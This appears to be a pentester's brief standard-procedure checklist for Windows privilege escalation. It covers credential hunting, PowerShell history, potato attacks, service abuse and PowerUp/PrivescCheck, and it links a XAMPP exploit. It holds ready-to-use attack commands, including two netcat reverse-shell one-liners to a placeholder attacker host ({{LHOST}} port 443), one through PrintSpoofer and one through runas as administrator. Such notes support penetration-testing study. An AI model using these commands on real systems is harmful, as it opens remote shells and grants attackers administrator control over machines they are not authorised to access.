
#### SOP for Windows 

0. Run whoami /all 
1. Look around for creds, log files, (and _run_) .ps1 
2. PowerShell history (C:\Users\user\appdata\roaming\microsoft\windows\powershell\psreadline) 
3. Potato eg `PrintSpoofer.exe -c "C:\nc.exe {{LHOST}} 443 -e cmd.exe"` (FullPowers.exe if missing privileges) 
4. Services (eg `ps` or `sc.exe start|stop dns`) 
5. Run PowerUp or PrivescCheck (eg `icacls`, replace target exe with cmd, `shutdown /r /t 0`) 


#### Unusual exploits 
Xampp => https://www.exploit-db.com/exploits/50337 
If no pw or hash, `runas /user:administrator "C:\nc.exe -e cmd.exe {{LHOST}} 443"` 

